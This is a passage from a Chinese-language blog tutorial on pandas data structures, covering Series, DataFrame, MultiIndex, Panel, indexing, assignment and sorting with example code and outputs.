<li>通过字典数据创建<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.Series(&#123;<span class="string">&#x27;red&#x27;</span>:<span class="number">100</span>, <span class="string">&#x27;blue&#x27;</span>:<span class="number">200</span>, <span class="string">&#x27;green&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;yellow&#x27;</span>:<span class="number">1000</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行结果</span></span><br><span class="line">blue       <span class="number">200</span></span><br><span class="line">green      <span class="number">500</span></span><br><span class="line">red        <span class="number">100</span></span><br><span class="line">yellow    <span class="number">1000</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="2-1-2-Series的属性"><a href="#2-1-2-Series的属性" class="headerlink" title="2.1.2 Series的属性"></a>2.1.2 Series的属性</h3><p><strong>Series 中提供了两个属性: index 和 values</strong></p>
<ul>
<li>index<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color_count.index</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">Index([<span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>values<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color_count.values</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">array([ <span class="number">200</span>,  <span class="number">500</span>,  <span class="number">100</span>, <span class="number">1000</span>])</span><br></pre></td></tr></table></figure>
也可以使用索引来获取数据：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color_count[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-2-DataFrame"><a href="#2-2-DataFrame" class="headerlink" title="2.2 DataFrame"></a>2.2 DataFrame</h2><p>DataFrame是一个类似于二维数组或表格(如excel)的对象，既有行索引，又有列索引</p>
<ul>
<li>行索引，表明不同行，横向索引，叫index，0轴，axis=0</li>
<li>列索引，表名不同列，纵向索引，叫columns，1轴，axis=1<br><img src="df.png" alt="df"></li>
</ul>
<h3 id="2-2-1-DataFrame的创建"><a href="#2-2-1-DataFrame的创建" class="headerlink" title="2.2.1 DataFrame的创建"></a>2.2.1 DataFrame的创建</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入pandas</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">pd.DataFrame(data=<span class="literal">None</span>, index=<span class="literal">None</span>, columns=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>参数：<ul>
<li>index：行标签。如果没有传入索引参数，则默认会自动创建一个从 0-N 的整数索引。</li>
<li>columns：列标签。如果没有传入索引参数，则默认会自动创建一个从 0-N 的整数索引。</li>
</ul>
</li>
<li>通过已有数据创建<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.DataFrame(np.random.randn(<span class="number">2</span>,<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/dataframe%E5%88%9B%E5%BB%BA%E4%B8%BE%E4%BE%8B.png" alt="dataframe创建举例"></li>
<li>创建学生成绩表（举例）<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># numpy</span></span><br><span class="line"><span class="comment"># 生成10名同学，5门功课的数据</span></span><br><span class="line">score = np.random.randint(<span class="number">40</span>, <span class="number">100</span>, (<span class="number">10</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">array([[<span class="number">92</span>, <span class="number">55</span>, <span class="number">78</span>, <span class="number">50</span>, <span class="number">50</span>],</span><br><span class="line">       [<span class="number">71</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">96</span>],</span><br><span class="line">       [<span class="number">45</span>, <span class="number">84</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">68</span>],</span><br><span class="line">       [<span class="number">81</span>, <span class="number">91</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">76</span>],</span><br><span class="line">       [<span class="number">86</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">95</span>],</span><br><span class="line">       [<span class="number">46</span>, <span class="number">86</span>, <span class="number">56</span>, <span class="number">61</span>, <span class="number">99</span>],</span><br><span class="line">       [<span class="number">46</span>, <span class="number">95</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">56</span>],</span><br><span class="line">       [<span class="number">80</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">65</span>, <span class="number">57</span>],</span><br><span class="line">       [<span class="number">41</span>, <span class="number">93</span>, <span class="number">90</span>, <span class="number">41</span>, <span class="number">97</span>],</span><br><span class="line">       [<span class="number">65</span>, <span class="number">83</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">40</span>]])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用Pandas中的数据结构</span></span><br><span class="line">score_df = pd.DataFrame(score)</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/score1.png" alt="score1"><br>增加行、列索引<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造行索引序列</span></span><br><span class="line">subjects = [<span class="string">&quot;语文&quot;</span>, <span class="string">&quot;数学&quot;</span>, <span class="string">&quot;英语&quot;</span>, <span class="string">&quot;政治&quot;</span>, <span class="string">&quot;体育&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造列索引序列</span></span><br><span class="line">stu = [<span class="string">&#x27;同学&#x27;</span> + <span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(score_df.shape[<span class="number">0</span>])]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加行索引</span></span><br><span class="line">data = pd.DataFrame(score, columns=subjects, index=stu)</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/score2.png" alt="score2"></li>
</ul>
<h3 id="2-2-2-DataFrame-的属性"><a href="#2-2-2-DataFrame-的属性" class="headerlink" title="2.2.2 DataFrame 的属性"></a>2.2.2 DataFrame 的属性</h3><ul>
<li>shape<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.shape</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">(<span class="number">10</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure></li>
<li>index<br>DataFrame 的行索引列表<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.index</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">Index([<span class="string">&#x27;同学0&#x27;</span>, <span class="string">&#x27;同学1&#x27;</span>, <span class="string">&#x27;同学2&#x27;</span>, <span class="string">&#x27;同学3&#x27;</span>, <span class="string">&#x27;同学4&#x27;</span>, <span class="string">&#x27;同学5&#x27;</span>, <span class="string">&#x27;同学6&#x27;</span>, <span class="string">&#x27;同学7&#x27;</span>, <span class="string">&#x27;同学8&#x27;</span>, <span class="string">&#x27;同学9&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>columns<br>DataFrame 的列索引列表<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">Index([<span class="string">&#x27;语文&#x27;</span>, <span class="string">&#x27;数学&#x27;</span>, <span class="string">&#x27;英语&#x27;</span>, <span class="string">&#x27;政治&#x27;</span>, <span class="string">&#x27;体育&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>values<br>直接获取其中 array 的值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.values</span><br><span class="line"></span><br><span class="line">array([[<span class="number">92</span>, <span class="number">55</span>, <span class="number">78</span>, <span class="number">50</span>, <span class="number">50</span>],</span><br><span class="line">       [<span class="number">71</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">96</span>],</span><br><span class="line">       [<span class="number">45</span>, <span class="number">84</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">68</span>],</span><br><span class="line">       [<span class="number">81</span>, <span class="number">91</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">76</span>],</span><br><span class="line">       [<span class="number">86</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">95</span>],</span><br><span class="line">       [<span class="number">46</span>, <span class="number">86</span>, <span class="number">56</span>, <span class="number">61</span>, <span class="number">99</span>],</span><br><span class="line">       [<span class="number">46</span>, <span class="number">95</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">56</span>],</span><br><span class="line">       [<span class="number">80</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">65</span>, <span class="number">57</span>],</span><br><span class="line">       [<span class="number">41</span>, <span class="number">93</span>, <span class="number">90</span>, <span class="number">41</span>, <span class="number">97</span>],</span><br><span class="line">       [<span class="number">65</span>, <span class="number">83</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">40</span>]])</span><br></pre></td></tr></table></figure></li>
<li>T<br>转置<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.T</span><br></pre></td></tr></table></figure></li>
<li>head(n)<br>显示前 n 行，如果不填参数，默认 5 行<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.head(<span class="number">5</span>)</span><br></pre></td></tr></table></figure></li>
<li>tail(n)<br>显示后 n 行，如果不填参数，默认 5 行<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.tail()</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-2-3-DataFramle-索引设置"><a href="#2-2-3-DataFramle-索引设置" class="headerlink" title="2.2.3 DataFramle 索引设置"></a>2.2.3 DataFramle 索引设置</h3><ul>
<li><p>修改行列索引值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stu = [<span class="string">&quot;学生_&quot;</span> + <span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(score_df.shape[<span class="number">0</span>])]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须整体全部修改</span></span><br><span class="line">data.index = stu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误修改方式</span></span><br><span class="line">data.index[<span class="number">3</span>] = <span class="string">&#x27;学生_3&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/score%E4%BF%AE%E6%94%B9%E7%B4%A2%E5%BC%95.png" alt="score修改索引"></p>
</li>
<li><p>重设索引</p>
<ul>
<li>reset_index(drop=False)<ul>
<li>设置新的下标索引</li>
<li>drop：默认为False，不删除原来索引，如果为True,删除原来的索引值<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重置索引,drop=False</span></span><br><span class="line">data.reset_index()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置索引,drop=True</span></span><br><span class="line">.data.reset_index(drop=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E9%87%8D%E8%AE%BE%E7%B4%A2%E5%BC%951.png" alt="重设索引1"></li>
</ul>
</li>
</ul>
</li>
<li><p>以某列值设置为新的索引</p>
<ul>
<li>set_index(keys, drop=True)<ul>
<li>keys : 列索引名成或者列索引名称的列表</li>
<li>drop : boolean, default True.当做新的索引，删除原来的列<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;month&#x27;</span>: [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>],</span><br><span class="line">                  <span class="string">&#x27;year&#x27;</span>: [<span class="number">2012</span>, <span class="number">2014</span>, <span class="number">2013</span>, <span class="number">2014</span>],</span><br><span class="line">                  <span class="string">&#x27;sale&#x27;</span>:[<span class="number">55</span>, <span class="number">40</span>, <span class="number">84</span>, <span class="number">31</span>]&#125;)</span><br><span class="line"></span><br><span class="line">   month  sale  year</span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>      <span class="number">55</span>    <span class="number">2012</span></span><br><span class="line"><span class="number">1</span>  <span class="number">4</span>      <span class="number">40</span>    <span class="number">2014</span></span><br><span class="line"><span class="number">2</span>  <span class="number">7</span>      <span class="number">84</span>    <span class="number">2013</span></span><br><span class="line"><span class="number">3</span>  <span class="number">10</span>     <span class="number">31</span>    <span class="number">2014</span></span><br></pre></td></tr></table></figure>
以月份设置新的索引<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df.set_index(<span class="string">&#x27;month&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">       sale  year</span><br><span class="line">month</span><br><span class="line"><span class="number">1</span>      <span class="number">55</span>    <span class="number">2012</span></span><br><span class="line"><span class="number">4</span>      <span class="number">40</span>    <span class="number">2014</span></span><br><span class="line"><span class="number">7</span>      <span class="number">84</span>    <span class="number">2013</span></span><br><span class="line"><span class="number">10</span>     <span class="number">31</span>    <span class="number">2014</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># df.index,注意 month 为 name 了</span></span><br><span class="line">Int64Index([<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>], dtype=<span class="string">&#x27;int64&#x27;</span>, name=<span class="string">&#x27;month&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># df.columns</span></span><br><span class="line">Index([<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;sale&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br></pre></td></tr></table></figure>
设置多个索引，以年和月份<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = df.set_index([<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;month&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">            sale</span><br><span class="line">year  month</span><br><span class="line"><span class="number">2012</span>  <span class="number">1</span>     <span class="number">55</span></span><br><span class="line"><span class="number">2014</span>  <span class="number">4</span>     <span class="number">40</span></span><br><span class="line"><span class="number">2013</span>  <span class="number">7</span>     <span class="number">84</span></span><br><span class="line"><span class="number">2014</span>  <span class="number">10</span>    <span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># df.index</span></span><br><span class="line">MultiIndex([(<span class="number">2012</span>,  <span class="number">1</span>),</span><br><span class="line">          (<span class="number">2014</span>,  <span class="number">4</span>),</span><br><span class="line">          (<span class="number">2013</span>,  <span class="number">7</span>),</span><br><span class="line">          (<span class="number">2014</span>, <span class="number">10</span>)],</span><br><span class="line">         names=[<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;month&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># df.columns</span></span><br><span class="line">Index([<span class="string">&#x27;sale&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：DataFrame 已经变成了一个具有MultiIndex的DataFrame</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="2-3-MultiIndex"><a href="#2-3-MultiIndex" class="headerlink" title="2.3 MultiIndex"></a>2.3 MultiIndex</h2><p>MultiIndex是三维的数据结构;</p>
<p>多级索引（也称层次化索引）是pandas的重要功能，可以在Series、DataFrame对象上拥有2个以及2个以上的索引。</p>
<h3 id="2-3-1-multiIndex的特性"><a href="#2-3-1-multiIndex的特性" class="headerlink" title="2.3.1 multiIndex的特性"></a>2.3.1 multiIndex的特性</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;month&#x27;</span>: [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>],</span><br><span class="line">                    <span class="string">&#x27;year&#x27;</span>: [<span class="number">2012</span>, <span class="number">2014</span>, <span class="number">2013</span>, <span class="number">2014</span>],</span><br><span class="line">                    <span class="string">&#x27;sale&#x27;</span>:[<span class="number">55</span>, <span class="number">40</span>, <span class="number">84</span>, <span class="number">31</span>]&#125;)</span><br><span class="line">df = df.set_index([<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;month&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df.index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">MultiIndex([(<span class="number">2012</span>,  <span class="number">1</span>),</span><br><span class="line">          (<span class="number">2014</span>,  <span class="number">4</span>),</span><br><span class="line">          (<span class="number">2013</span>,  <span class="number">7</span>),</span><br><span class="line">          (<span class="number">2014</span>, <span class="number">10</span>)],</span><br><span class="line">         names=[<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;month&#x27;</span>])</span><br><span class="line"></span><br><span class="line">df.index.levels</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">[[<span class="number">2012</span>, <span class="number">2013</span>, <span class="number">2014</span>], [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>]]</span><br><span class="line"></span><br><span class="line">df.index.names</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">[<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;month&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>多级或分层索引对象。</p>
<ul>
<li>index属性<ul>
<li>names:levels的名称</li>
<li>levels：每个level的元组值</li>
</ul>
</li>
</ul>
<h3 id="2-3-2-multiIndex的创建"><a href="#2-3-2-multiIndex的创建" class="headerlink" title="2.3.2 multiIndex的创建"></a>2.3.2 multiIndex的创建</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">arrays = [[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>], [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>]]</span><br><span class="line">pd.MultiIndex.from_arrays(arrays, names=(<span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;color&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">MultiIndex(levels=[[<span class="number">1</span>, <span class="number">2</span>], [<span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;red&#x27;</span>]],</span><br><span class="line">           codes=[[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]],</span><br><span class="line">           names=[<span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;color&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h2 id="2-4-Panel-从-0-20-0-开始弃用"><a href="#2-4-Panel-从-0-20-0-开始弃用" class="headerlink" title="2.4 Panel( 从 0.20.0 开始弃用)"></a>2.4 Panel( 从 0.20.0 开始弃用)</h2><h3 id="2-4-1-panel-的创建"><a href="#2-4-1-panel-的创建" class="headerlink" title="2.4.1 panel 的创建"></a>2.4.1 panel 的创建</h3><ul>
<li>class pandas.Panel(data=None, items=None, major_axis=None, minor_axis=None)<ul>
<li>作用：存储3维数组的Panel结构</li>
<li>参数：<ul>
<li>data : ndarray或者dataframe</li>
<li>items : 索引或类似数组的对象，axis=0</li>
<li>major_axis : 索引或类似数组的对象，axis=1</li>
<li>minor_axis : 索引或类似数组的对象，axis=2<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = pd.Panel(data=np.arange(<span class="number">24</span>).reshape(<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>),</span><br><span class="line">                 items=<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>),</span><br><span class="line">                 major_axis=pd.date_range(<span class="string">&#x27;20130101&#x27;</span>, periods=<span class="number">3</span>),</span><br><span class="line">                 minor_axis=[<span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;second&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">pandas</span>.<span class="title">core</span>.<span class="title">panel</span>.<span class="title">Panel</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"><span class="title">Dimensions</span>:</span> <span class="number">4</span> (items) x <span class="number">3</span> (major_axis) x <span class="number">2</span> (minor_axis)</span><br><span class="line">Items axis: A to D</span><br><span class="line">Major_axis axis: <span class="number">2013</span>-01-01 <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> to <span class="number">2013</span>-01-03 <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Minor_axis axis: first to second</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-4-2-查看panel数据"><a href="#2-4-2-查看panel数据" class="headerlink" title="2.4.2 查看panel数据"></a>2.4.2 查看panel数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p[:,:,<span class="string">&quot;first&quot;</span>]</span><br><span class="line">p[<span class="string">&quot;B&quot;</span>,:,:]</span><br></pre></td></tr></table></figure>

<h1 id="3-基本数据操作"><a href="#3-基本数据操作" class="headerlink" title="3 | 基本数据操作"></a>3 | 基本数据操作</h1><p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/stockday.png" alt="stockday"></p>
<h2 id="3-1-索引操作"><a href="#3-1-索引操作" class="headerlink" title="3.1 索引操作"></a>3.1 索引操作</h2><ol>
<li>直接使用行列索引（先列后行）<br>获取’2018-02-27’这天的’close’的结果<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接使用行列索引名字的方式（先列后行）</span></span><br><span class="line">data[<span class="string">&#x27;open&#x27;</span>][<span class="string">&#x27;2018-02-27&#x27;</span>]</span><br><span class="line"><span class="number">23.53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不支持的操作</span></span><br><span class="line"><span class="comment"># 错误</span></span><br><span class="line">data[<span class="string">&#x27;2018-02-27&#x27;</span>][<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="comment"># 错误</span></span><br><span class="line">data[:<span class="number">1</span>, :<span class="number">2</span>]</span><br></pre></td></tr></table></figure></li>
<li>结合loc或者iloc使用索引<br>获取从’2018-02-27’:’2018-02-22’，’open’的结果<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用loc:只能指定行列索引的名字</span></span><br><span class="line">data.loc[<span class="string">&#x27;2018-02-27&#x27;</span>:<span class="string">&#x27;2018-02-22&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">27</span>    <span class="number">23.53</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">26</span>    <span class="number">22.80</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">23</span>    <span class="number">22.88</span></span><br><span class="line">Name: <span class="built_in">open</span>, dtype: float64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用iloc可以通过索引的下标去获取</span></span><br><span class="line"><span class="comment"># 获取前3天数据,前5列的结果</span></span><br><span class="line">data.iloc[:<span class="number">3</span>, :<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">open</span>    high    close    low</span><br><span class="line"><span class="number">2018</span>-02-<span class="number">27</span>    <span class="number">23.53</span>    <span class="number">25.88</span>    <span class="number">24.16</span>    <span class="number">23.53</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">26</span>    <span class="number">22.80</span>    <span class="number">23.78</span>    <span class="number">23.53</span>    <span class="number">22.80</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">23</span>    <span class="number">22.88</span>    <span class="number">23.37</span>    <span class="number">22.82</span>    <span class="number">22.71</span></span><br></pre></td></tr></table></figure></li>
<li>使用ix组合索引<blockquote>
<p>Warning:Starting in 0.20.0, the .ix indexer is deprecated, in favor of the more strict .iloc and .loc indexers.<br>获取行第1天到第4天，[‘open’, ‘close’, ‘high’, ‘low’]这个四个指标的结果</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用ix进行下表和名称组合做引</span></span><br><span class="line">data.ix[<span class="number">0</span>:<span class="number">4</span>, [<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推荐使用loc和iloc来获取的方式</span></span><br><span class="line">data.loc[data.index[<span class="number">0</span>:<span class="number">4</span>], [<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>]]</span><br><span class="line">data.iloc[<span class="number">0</span>:<span class="number">4</span>, data.columns.get_indexer([<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>])]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">open</span>    close    high    low</span><br><span class="line"><span class="number">2018</span>-02-<span class="number">27</span>    <span class="number">23.53</span>    <span class="number">24.16</span>    <span class="number">25.88</span>    <span class="number">23.53</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">26</span>    <span class="number">22.80</span>    <span class="number">23.53</span>    <span class="number">23.78</span>    <span class="number">22.80</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">23</span>    <span class="number">22.88</span>    <span class="number">22.82</span>    <span class="number">23.37</span>    <span class="number">22.71</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">22</span>    <span class="number">22.25</span>    <span class="number">22.28</span>    <span class="number">22.76</span>    <span class="number">22.02</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="3-2-赋值操作"><a href="#3-2-赋值操作" class="headerlink" title="3.2 赋值操作"></a>3.2 赋值操作</h2><p>对DataFrame当中的close列进行重新赋值为1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接修改原来的值</span></span><br><span class="line">data[<span class="string">&#x27;close&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">data.close = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="3-3-排序"><a href="#3-3-排序" class="headerlink" title="3.3 排序"></a>3.3 排序</h2><p>排序有两种形式，一种对于索引进行排序，一种对于内容进行排序</p>
<h3 id="3-3-1-DataFrame-排序"><a href="#3-3-1-DataFrame-排序" class="headerlink" title="3.3.1 DataFrame 排序"></a>3.3.1 DataFrame 排序</h3><ul>
<li>使用df.sort_values(by=, ascending=)<ul>
<li>单个键或者多个键进行排序,</li>
<li>参数：<ul>
<li>by：指定排序参考的键</li>
<li>ascending:默认升序<ul>
<li>ascending=False:降序</li>
<li>ascending=True:升序<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按照开盘价大小进行排序 , 使用ascending指定按照大小排序</span></span><br><span class="line">data.sort_values(by=<span class="string">&quot;open&quot;</span>, ascending=<span class="literal">True</span>).head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照多个键进行排序</span></span><br><span class="line">data.sort_values(by=[<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>使用df.sort_index给索引进行排序<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对索引进行排序, 这个股票的日期索引原来是从大到小，现在重新排序，从小到大</span></span><br><span class="line">data.sort_index()</span><br></pre></td></tr></table></figure>
<h2 id="3-3-2-Series-排序"><a href="#3-3-2-Series-排序" class="headerlink" title="3.3.2 Series 排序"></a>3.3.2 Series 排序</h2></li>
<li>使用series.sort_values(ascending=True)进行排序，series排序时，只有一列，不需要参数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;p_change&#x27;</span>].sort_values(ascending=<span class="literal">True</span>).head()</span><br><span class="line"></span><br><span class="line"><span class="number">2015</span>-09-01   -<span class="number">10.03</span></span><br><span class="line"><span class="number">2015</span>-09-<span class="number">14</span>   -<span class="number">10.02</span></span><br><span class="line"><span class="number">2016</span>-01-<span class="number">11</span>   -<span class="number">10.02</span></span><br><span class="line"><span class="number">2015</span>-07-<span class="number">15</span>   -<span class="number">10.02</span></span><br><span class="line"><span class="number">2015</span>-08-<span class="number">26</span>   -<span class="number">10.01</span></span><br><span class="line">Name: p_change, dtype: float64</span><br></pre></td></tr></table></figure></li>
